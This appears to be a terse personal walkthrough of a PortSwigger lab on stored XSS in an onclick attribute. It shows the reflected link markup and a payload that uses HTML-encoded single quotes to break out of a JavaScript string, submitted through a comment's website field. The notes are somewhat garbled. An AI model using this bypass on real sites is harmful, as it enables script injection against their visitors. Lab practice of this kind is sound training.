# Lab: Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped
# https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped

```bash
# Create a comment and put a to author name.
# inspect q on author name a.

<a id="author" href="https://0a330c.web-security-academy.net/post?postId=10" onclick="var tracker={track(){}};
tracker.track('https://0a330089032ef49f8ad20c3a0009006c.web-security-academy.net/post?postId=10');">a</a>
```

```bash
# Let's focus on attacking website.

http://abc?'alert()'

# Html encode this

http://abc?&apos;-alert()-&apos;

# And create a comment with this website.
``
